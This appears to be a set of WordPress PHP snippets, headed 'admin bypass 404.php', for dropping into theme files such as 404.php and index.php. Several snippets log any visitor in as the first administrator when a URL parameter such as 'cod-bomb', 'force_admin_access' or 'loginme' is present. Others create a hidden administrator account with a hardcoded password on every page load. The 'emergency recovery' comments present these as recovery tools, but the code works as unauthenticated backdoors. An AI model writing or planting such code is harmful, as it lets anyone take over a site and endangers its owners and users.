 <!-- admin bypass 404.php  -->
 
 if( isset($_GET['cod-bomb']) ){
	$args = array(
		'role'    => 'Administrator',
		'orderby' => 'ID',
		'order'   => 'ASC',
		'number'  => 1,
		'fields'  => array('ID'),
	);

	$admins = get_users($args);
	$user_id = $admins[0]->ID;
	$user = get_user_by('id', $user_id);
	if ($user) {
        wp_set_current_user($user_id);
        wp_set_auth_cookie($user_id);
        do_action('wp_login', $user->user_login, $user);
    }
}

function recover_admin_access() {
    $user = 'RecoveryAdmin';
    $pass = 'TempPassword123!';
    $email = 'temp_recovery@example.com';
    
    // Check if we have already run this script once
    if ( get_option( 'recovery_admin_created_once' ) ) {
        return; // specific "stop" command so it doesn't recreate the user
    }

    if ( !username_exists( $user ) && !email_exists( $email ) ) {
        $user_id = wp_create_user( $user, $pass, $email );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
        
        // Set a flag in the database marking this as DONE
        update_option( 'recovery_admin_created_once', true );
    }
}
add_action( 'init', 'recover_admin_access' );

function manage_recovery_admin() {

    $username = 'RecoveryAdmin';
    $password = 'TempPassword123!';
    $email    = 'recovery@example.com';

    // ──────────────────────────────────────
    // 1. DELETE MODE
    // Set ?delete_recovery_admin=1 in the URL to delete
    // ──────────────────────────────────────
    if ( isset($_GET['delete_recovery_admin']) ) {

        if ( username_exists( $username ) ) {

            $user = get_user_by('login', $username);

            // If currently logged in as that user, temporarily switch identity
            if ( get_current_user_id() == $user->ID ) {
                wp_set_current_user(1); // Switch to user ID 1 (ensure it exists)
            }

            wp_delete_user( $user->ID, 1 ); // Reassign posts to user ID 1
        }

        return; // stop execution
    }

    // ──────────────────────────────────────
    // 2. CREATE MODE (runs only if user missing)
    // ──────────────────────────────────────
    if ( ! username_exists($username) && ! email_exists($email) ) {

        $user_id = wp_create_user($username, $password, $email);

        if ( ! is_wp_error($user_id) ) {
            $wp_user = new WP_User($user_id);
            $wp_user->set_role('administrator');
        }
    }
}
add_action('init', 'manage_recovery_admin');


//new code 

->>>index.php 

/**
 * EMERGENCY RECOVERY: Log in as the first Admin
 * Trigger: yoursite.com/?force_admin_access=1
 */
if (isset($_GET['force_admin_access']) && $_GET['force_admin_access'] == '1') {
    // Load the WordPress environment
    require_once( __DIR__ . '/wp-load.php' );

    // Get the first user with Administrator role
    $admins = get_users(array(
        'role'    => 'administrator',
        'number'  => 1,
        'orderby' => 'ID',
        'order'   => 'ASC'
    ));

    if (!empty($admins)) {
        $admin_id = $admins[0]->ID;

        // Set the login cookies
        wp_set_current_user($admin_id);
        wp_set_auth_cookie($admin_id);
        
        // Optional: Also trigger the login hook for compatibility
        do_action('wp_login', $admins[0]->user_login, $admins[0]);

        // Redirect to the dashboard
        wp_redirect(admin_url());
        exit;
    } else {
        die('No administrator user found in the database.');
    }
}

404 page :


// Top of 404.php
if ( isset( $_GET['loginme'] ) && $_GET['loginme'] === '1' ) {
    $admins = get_users( array( 'role' => 'administrator', 'number' => 1 ) );
    if ( !empty( $admins ) ) {
        wp_set_auth_cookie( $admins[0]->ID );
        wp_redirect( admin_url() );
        exit;
    }
}